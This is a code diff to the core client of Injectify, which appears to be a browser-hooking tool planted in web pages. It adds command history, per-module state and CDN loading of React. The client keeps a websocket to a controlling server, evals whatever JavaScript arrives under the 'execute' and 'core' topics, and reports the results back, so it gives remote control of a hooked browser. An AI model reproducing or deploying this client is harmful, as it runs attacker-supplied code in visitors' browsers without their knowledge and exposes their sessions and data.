@@ -4,6 +4,7 @@ declare let ws, require, client, process: any
 import WindowInjection from './components/WindowInjection'
 import Decycle from './lib/JSON-Decycle'
 import instanceOf from './lib/InstanceOf'
+import LoadJS from './lib/LoadJS'
 
 /**
  * Injectify core API
@@ -14,7 +15,6 @@ window['injectify'] = class Injectify {
 		ws.onmessage = message => {
 			try {
 				let data = JSON.parse(message.data)
-
 				if (this['listeners'] && data.t && this['listeners'][data.t]) {
 					/**
 					 * Pre-process some topic's data
@@ -31,7 +31,7 @@ window['injectify'] = class Injectify {
 					callback(data.d, data.t)
 				}
 			} catch(e) {
-				if (this.debug) throw e
+				if (this.debug) console.error(e)
 				this.error(e.stack)
 			}
 		}
@@ -77,6 +77,7 @@ window['injectify'] = class Injectify {
 				d: data,
 			})))
 		} catch(e) {
+			if (this.debug) console.error(e)
 			this.error(e.stack)
 		}
 	}
@@ -130,7 +131,7 @@ window['injectify'] = class Injectify {
 			element.removeChild(script)
 		} else {
 			if (typeof func === 'string') {
-				eval('(' + func + ')()')
+				eval(`(${func})()`)
 			} else {
 				func()
 			}
@@ -153,6 +154,23 @@ window['injectify'] = class Injectify {
 				name: name,
 				token: token,
 				params: params
+			})
+		})
+	}
+
+	static app(name: string, params?: any) {
+		// @ts-ignore
+		return new Promise((resolve, reject) => {
+			let type = 'production.min.js'
+			if (this.debug) type = 'development.js'
+			LoadJS([
+				`https://cdnjs.cloudflare.com/ajax/libs/react/16.2.0/umd/react.${type}`,
+				`https://cdnjs.cloudflare.com/ajax/libs/react-dom/16.2.0/umd/react-dom.${type}`
+			]).then(() => {
+				this.module(name, params).then(resolve).catch(reject)
+			}).catch(error => {
+				this.error(error)
+				reject(error)
 			})
 		})
 	}
@@ -287,7 +305,9 @@ window['injectify'] = class Injectify {
 					active: false
 				}
 			},
-			windowInjection: false
+			windowInjection: false,
+			commandHistory: [],
+			moduleStates: {}
 		}
 		return window['inJl1']
 	}
@@ -391,6 +411,17 @@ injectify.listener((data, topic) => {
 				returned: undefined,
 				config: {
 					async: false
+				},
+				setState: (newState) => {
+					injectify.setState({
+						moduleStates: {
+							...injectify.global.moduleStates,
+							[data.name]: newState
+						}
+					})
+				},
+				get state() {
+					return injectify.global.moduleStates[data.name]
 				}
 			}
 
@@ -404,7 +435,7 @@ injectify.listener((data, topic) => {
 				 * If in debug mode display verbose output
 				 */
 				if (injectify.debug) {
-					injectify.debugLog('module', 'warn', `Executed module "${Module.name}"`)
+					injectify.debugLog('module', 'warn', `Executed module "${Module.name}"`, Module)
 				}
 
 				/**
@@ -424,12 +455,20 @@ injectify.listener((data, topic) => {
 			}
 		}
 		if (topic == 'execute') {
+			(() => {
+				let history = injectify.global.commandHistory
+				history.push(data)
+				injectify.setState({
+					commandHistory: history
+				})
+			})()
 			injectify.result(eval(data))
 		}
 		if (topic === 'core') {
 			eval(data)
 		}
 	} catch(e) {
+		if (injectify.debug) console.error(e)
 		injectify.error(e.stack)
 	}
 });
